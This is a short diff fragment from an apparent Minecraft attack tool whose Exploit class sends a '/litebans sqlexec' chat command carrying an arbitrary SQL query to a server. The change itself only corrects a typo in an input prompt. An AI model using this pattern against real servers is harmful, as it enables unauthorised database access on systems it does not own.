@@ -33,6 +33,6 @@ class Exploit:
         packet.message = "/litebans sqlexec {}".format(self.query)  #: assigns packet sql query
         self.client.write_packet(packet)  #: sends message
 
-        input('Press enter wen response.')
+        input('Press enter when response.')
 
         return True, "Success in Message"
